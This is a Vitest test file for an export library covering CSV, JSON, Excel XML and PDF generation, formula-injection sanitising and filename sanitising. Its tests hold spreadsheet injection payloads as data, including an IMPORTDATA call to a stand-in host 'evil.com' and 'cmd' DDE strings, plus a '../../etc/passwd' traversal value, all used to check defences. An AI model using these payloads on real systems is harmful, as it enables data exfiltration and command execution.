import { describe, it, expect } from 'vitest'
import {
  exportData,
  generateReport,
  exportAndStore,
  recordsToCsv,
  recordsToJson,
  recordsToExcelXml,
  generatePdfDocument,
  generatePrintableHtml,
  sanitizeFormulaValue,
  sanitizeExportFilename,
  type ReportDocument,
} from '@/lib/export'
import { LocalStorageAdapter } from '@/lib/storage/local'

describe('Part 4.15 — Export, Reporting & Document Generation Toolkit', () => {
  const sampleData = [
    { id: 1, name: 'Alice Smith', email: 'alice@example.com', score: 98.5, active: true },
    { id: 2, name: 'Bob Jones', email: 'bob@example.com', score: 84.0, active: false },
    { id: 3, name: 'Charlie Brown', email: 'charlie@example.com', score: 91.2, active: true },
  ]

  describe('1. CSV Serialization & Formula-Injection Defense', () => {
    it('serializes records to RFC-4180 CSV with quotes, headers, and BOM', () => {
      const csv = recordsToCsv(sampleData, {
        columns: [
          { key: 'name', header: 'Full Name' },
          { key: 'score', header: 'Score' },
        ],
      })

      // Starts with UTF-8 BOM
      expect(csv.startsWith('\uFEFF')).toBe(true)
      expect(csv).toContain('Full Name,Score')
      expect(csv).toContain('Alice Smith,98.5')
      expect(csv).toContain('Bob Jones,84')
    })

    it('neutralizes formula injection characters (=, +, -, @, \\t, \\r)', () => {
      // Malicious payloads
      expect(sanitizeFormulaValue('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)")
      expect(sanitizeFormulaValue('@IMPORTDATA("http://evil.com")')).toBe("'@IMPORTDATA(\"http://evil.com\")")
      expect(sanitizeFormulaValue('+cmd|\' /C calc\'!A0')).toBe("'+cmd|' /C calc'!A0")
      expect(sanitizeFormulaValue('-2+3+cmd|')).toBe("'-2+3+cmd|")

      // Standard numeric values should NOT be sanitized as formulas
      expect(sanitizeFormulaValue('-42')).toBe('-42')
      expect(sanitizeFormulaValue('+100')).toBe('+100')
      expect(sanitizeFormulaValue('Normal text')).toBe('Normal text')
    })

    it('escapes cells containing delimiters, newlines, and double quotes', () => {
      const recordsWithQuotes = [
        { desc: 'He said, "Hello World"\nSecond line' },
      ]
      const csv = recordsToCsv(recordsWithQuotes, { includeBom: false })
      expect(csv).toContain('"He said, ""Hello World""\nSecond line"')
    })

    it('handles empty datasets cleanly without crashing', () => {
      const emptyCsv = recordsToCsv([], {
        columns: [{ key: 'id', header: 'ID' }],
        includeBom: false,
      })
      expect(emptyCsv).toBe('ID')
    })
  })

  describe('2. JSON Export & Projections', () => {
    it('exports enveloped JSON with title and metadata', () => {
      const jsonStr = recordsToJson(sampleData, {
        title: 'User Scores',
        metadata: { department: 'Engineering', version: '1.0' },
      })

      const parsed = JSON.parse(jsonStr)
      expect(parsed.title).toBe('User Scores')
      expect(parsed.totalRows).toBe(3)
      expect(parsed.metadata.department).toBe('Engineering')
      expect(parsed.data.length).toBe(3)
      expect(parsed.data[0].name).toBe('Alice Smith')
    })

    it('applies column formatters during JSON projection', () => {
      const jsonStr = recordsToJson(sampleData, {
        columns: [
          {
            key: 'name',
            header: 'Name',
            formatter: (v) => String(v).toUpperCase(),
          },
        ],
      })

      const parsed = JSON.parse(jsonStr)
      expect(parsed[0].name).toBe('ALICE SMITH')
      expect(parsed[0].email).toBeUndefined()
    })
  })

  describe('3. Excel (SpreadsheetML) Generation', () => {
    it('generates valid SpreadsheetML XML with styles and typed cells', () => {
      const xml = recordsToExcelXml(sampleData, {
        sheetName: 'Leaderboard',
        columns: [
          { key: 'name', header: 'Full Name', width: 150 },
          { key: 'score', header: 'Score', width: 80 },
          { key: 'active', header: 'Is Active' },
        ],
      })

      expect(xml).toContain('<?xml version="1.0" encoding="UTF-8"?>')
      expect(xml).toContain('ss:Name="Leaderboard"')
      expect(xml).toContain('<ss:Column ss:Width="150"/>')
      expect(xml).toContain('<ss:Data ss:Type="String">Alice Smith</ss:Data>')
      expect(xml).toContain('<ss:Data ss:Type="Number">98.5</ss:Data>')
      expect(xml).toContain('<ss:Data ss:Type="Boolean">1</ss:Data>')
    })
  })

  describe('4. PDF Vector Document & Printable HTML Generation', () => {
    const reportDoc: ReportDocument = {
      title: 'Quarterly Executive Summary',
      subtitle: 'Performance benchmarks and user metrics',
      author: 'Analytics Engine',
      headerText: 'Confidential Report',
      footerText: 'Internal Use Only',
      includePageNumbers: true,
      sections: [
        {
          type: 'heading',
          level: 1,
          content: 'Key Metrics',
        },
        {
          type: 'paragraph',
          content: 'This document highlights our platform growth and operational KPIs across regions.',
        },
        {
          type: 'key_value',
          data: {
            'Total Active Users': 15420,
            'System Uptime': '99.98%',
            'Mean Latency': '42ms',
          },
        },
        {
          type: 'heading',
          level: 2,
          content: 'Top Performing Accounts',
        },
        {
          type: 'table',
          data: sampleData,
          columns: [
            { key: 'name', header: 'Name' },
            { key: 'score', header: 'Score' },
            { key: 'active', header: 'Status', formatter: (v) => (v ? 'Active' : 'Inactive') },
          ],
        },
      ],
    }

    it('generates a valid %PDF-1.4 binary document with page catalogs and font dictionaries', () => {
      const pdfBytes = generatePdfDocument(reportDoc)
      expect(ArrayBuffer.isView(pdfBytes)).toBe(true)
      expect(pdfBytes.length).toBeGreaterThan(500)

      const pdfText = new TextDecoder().decode(pdfBytes)
      // Standard PDF 1.4 header
      expect(pdfText.startsWith('%PDF-1.4')).toBe(true)
      // Catalog and Pages objects
      expect(pdfText).toContain('/Type /Catalog')
      expect(pdfText).toContain('/Type /Pages')
      expect(pdfText).toContain('/BaseFont /Helvetica')
      expect(pdfText).toContain('/BaseFont /Helvetica-Bold')
      // Content included in stream
      expect(pdfText).toContain('Quarterly Executive Summary')
      // Trailer and EOF
      expect(pdfText).toContain('startxref')
      expect(pdfText.trim().endsWith('%%EOF')).toBe(true)
    })

    it('generates printable HTML with @media print CSS styles and tables', () => {
      const html = generatePrintableHtml(reportDoc)
      expect(html).toContain('<!DOCTYPE html>')
      expect(html).toContain('<title>Quarterly Executive Summary</title>')
      expect(html).toContain('@media print')
      expect(html).toContain('<table>')
      expect(html).toContain('<th>Name</th>')
      expect(html).toContain('<td>Alice Smith</td>')
    })
  })

  describe('5. Unified Dispatcher & Filename Sanitization', () => {
    it('sanitizes export filenames against directory traversal and appends format extensions', () => {
      expect(sanitizeExportFilename('../../etc/passwd', 'csv')).toBe('passwd.csv')
      expect(sanitizeExportFilename('report_2026.pdf', 'pdf')).toBe('report_2026.pdf')
      expect(sanitizeExportFilename('my_report', 'excel')).toBe('my_report.xls')
      expect(sanitizeExportFilename(undefined, 'json')).toMatch(/^export_\d+\.json$/)
    })

    it('exports data in multiple formats via unified exportData API', () => {
      // 1. CSV
      const csvResult = exportData(sampleData, 'csv', { filename: 'users' })
      expect(csvResult.format).toBe('csv')
      expect(csvResult.filename).toBe('users.csv')
      expect(csvResult.contentType).toContain('text/csv')
      expect(csvResult.rowCount).toBe(3)

      // 2. Excel
      const excelResult = exportData(sampleData, 'excel', { filename: 'users' })
      expect(excelResult.format).toBe('excel')
      expect(excelResult.filename).toBe('users.xls')
      expect(excelResult.contentType).toContain('application/vnd.ms-excel')

      // 3. PDF
      const pdfResult = exportData(sampleData, 'pdf', { filename: 'users' })
      expect(pdfResult.format).toBe('pdf')
      expect(pdfResult.filename).toBe('users.pdf')
      expect(pdfResult.contentType).toBe('application/pdf')
      expect(ArrayBuffer.isView(pdfResult.data)).toBe(true)
    })

    it('generates multi-section report via generateReport API', () => {
      const report: ReportDocument = {
        title: 'Audit Log',
        sections: [{ type: 'paragraph', content: 'No anomalies detected.' }],
      }

      const result = generateReport(report, 'pdf', { filename: 'audit_log' })
      expect(result.format).toBe('pdf')
      expect(result.filename).toBe('audit_log.pdf')
      expect(result.sizeBytes).toBeGreaterThan(200)
    })

    it('enforces maximum row limits and rejects malformed inputs', () => {
      expect(() => exportData('not an array' as unknown as unknown[], 'csv')).toThrow(
        'Records input must be an array'
      )

      expect(() =>
        exportData(sampleData, 'csv', { maxRows: 2 })
      ).toThrow(/exceeds maximum row limit/i)
    })
  })

  describe('6. Integration with File Storage Adapter', () => {
    it('exports data and stores it seamlessly using LocalStorageAdapter', async () => {
      const storage = new LocalStorageAdapter()

      const { exportResult, storageResult } = await exportAndStore(
        sampleData,
        'csv',
        storage,
        { filename: 'archived_users', isPublic: false }
      )

      expect(exportResult.format).toBe('csv')
      expect(storageResult.success).toBe(true)
      expect(storageResult.file?.name).toBe('archived_users.csv')

      // Verify that the stored file exists and matches
      const exists = await storage.exists(storageResult.file!.path)
      expect(exists).toBe(true)

      const downloaded = await storage.download(storageResult.file!.path)
      expect(downloaded.success).toBe(true)
      expect(downloaded.data?.toString('utf-8')).toContain('Alice Smith')
    })
  })
})
